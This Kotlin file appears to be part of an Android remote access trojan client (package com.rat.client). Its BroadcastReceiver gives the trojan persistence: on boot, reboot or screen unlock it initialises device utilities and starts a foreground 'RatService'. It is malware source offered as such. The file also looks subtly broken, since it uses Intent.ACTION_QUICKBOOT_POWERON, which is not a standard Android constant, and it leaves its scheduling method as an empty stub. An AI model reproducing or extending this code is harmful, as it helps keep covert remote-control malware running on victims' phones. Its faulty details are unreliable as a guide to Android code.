package com.rat.client.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.rat.client.service.RatService
import com.rat.client.util.DeviceUtils
import com.rat.client.util.PreferencesManager
import com.rat.client.util.SystemUtils

class BootReceiver : BroadcastReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "Received boot action: $action")

        when (action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_QUICKBOOT_POWERON,
            Intent.ACTION_REBOOT,
            Intent.ACTION_USER_PRESENT -> {
                // Initialize utilities
                PreferencesManager.init(context)
                DeviceUtils.init(context)
                SystemUtils.init(context)

                // Start persistent service
                val serviceIntent = Intent(context, RatService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }

                // Schedule periodic tasks using WorkManager
                schedulePeriodicWork(context)
            }
            Intent.ACTION_SHUTDOWN -> {
                // Cleanup on shutdown
                Log.d(TAG, "System shutting down")
            }
        }
    }

    private fun schedulePeriodicWork(context: Context) {
        // WorkManager would be used here for reliable periodic execution
        // For now, the service handles its own scheduling
    }
}